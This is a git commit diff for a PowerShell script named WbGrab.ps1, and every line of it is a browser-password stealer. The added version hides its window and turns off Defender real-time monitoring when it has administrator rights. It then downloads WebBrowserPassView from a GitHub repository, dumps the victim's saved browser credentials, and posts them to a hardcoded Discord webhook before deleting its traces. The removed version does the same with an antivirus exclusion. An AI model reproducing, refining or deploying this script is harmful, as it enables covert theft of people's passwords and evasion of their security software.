2d99c1adab1a94bca6e01b422ecd723768ac2e90
bindas88 <63970413+bindas88@users.noreply.github.com>
2024-08-12 17:17:58 +0700

    Update WbGrab.ps1

--- WbGrab.ps1
+++ WbGrab.ps1
@@ -1,41 +1,45 @@
-Set-Location C:\Users\Public\Documents
-
-Add-MpPreference -ExclusionPath 'C:\Users\Public\Documents' # Disabling antivirus activation
-
-Invoke-WebRequest https://raw.githubusercontent.com/bindas88/bd/main/bin/WebBrowserPassView.exe -OutFile WebBrowserPassView.exe #Download the nirsoft tool for Browser passwords
-
-.\WebBrowserPassView.exe /stext $env:TEMP/$env:USERNAME-passwords.txt #Create the file for Browser passwords
-
-Start-Sleep -Seconds 10
-
-RI WebBrowserPassView.exe
-
-Remove-MpPreference -ExclusionPath 'C:\Users\Public\Documents'
-
-
-
-function Upload-Discord {
-
-[CmdletBinding()]
-param (
-    [parameter(Position=0,Mandatory=$False)]
-    [string]$file,
-    [parameter(Position=1,Mandatory=$False)]
-    [string]$text 
-)
-
-$hookurl = "https://discord.com/api/webhooks/1168586821467381820/h-MBHVPPWdCK3gsFubvUyitgQDscQ7X7mzt56tEpOYO1didWgmdUZYJM3tN77MTNAcdC"
-
-$Body = @{
-  'username' = $env:username
-  'content' = $text
+$webhook = "https://discord.com/api/webhooks/1168586821467381820/h-MBHVPPWdCK3gsFubvUyitgQDscQ7X7mzt56tEpOYO1didWgmdUZYJM3tN77MTNAcdC";
+$IsAdmin = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+$Admin = $IsAdmin.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+$dir = "$env:temp\JHknfuiD"
+$HideWindow = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
+Function HideConsole{
+    If ($HideWindow -gt 0){
+    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
+    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
+    $hwnd = (Get-Process -PID $pid).MainWindowHandle
+        if($hwnd -ne [System.IntPtr]::Zero){
+            $Type::ShowWindowAsync($hwnd, 0)
+        }
+        else{
+            $Host.UI.RawUI.WindowTitle = 'hideme'
+            $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
+            $hwnd = $Proc.MainWindowHandle
+            $Type::ShowWindowAsync($hwnd, 0)
+        }
+    }
 }
-
-if (-not ([string]::IsNullOrEmpty($text))){
-Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
-
-if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+HideConsole
+if (!(Test-Path -Path "$dir")) {
+New-Item -ItemType Directory -Path "$dir"
 }
+if (-not $version) {
+  $version = "2.4.6"
+}
+$log = "$dir\$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
+$verm = "v$version"
+$zelda = "https://raw.githubusercontent.com/bindas88/bd/main/bin/WebBrowserPassView.exe" 
+if ($Admin -eq 'True') {
+  Set-MpPreference -DisableRealtimeMonitoring $true
 
-if (-not ([string]::IsNullOrEmpty($hookurl))){Upload-Discord -file "$env:TEMP/$env:USERNAME-passwords.txt"}
-
+  Add-MpPreference -ExclusionPath "$dir"
+}
+$hide = Get-Item "$dir" -Force
+$hide.attributes='Hidden'
+Invoke-WebRequest -Uri "$zelda" -OutFile "$dir\WebBrowserPassView.exe"
+& "$dir\WebBrowserPassView.exe" > "$log"
+curl.exe -F "payload_json={\`"username\`": \`"$env:ComputerName\`", \`"content\`": \`"New File Uploaded`!\n(Admin: $Admin) \`"}" -F "file=@\`"$log\`"" $webhook >$null 2>&1
+Start-Sleep -Seconds 20
+$unhide = Get-Item "$dir" -Force
+$unhide.attributes='Normal'
+Remove-Item -Path "$dir" -Recurse -Force
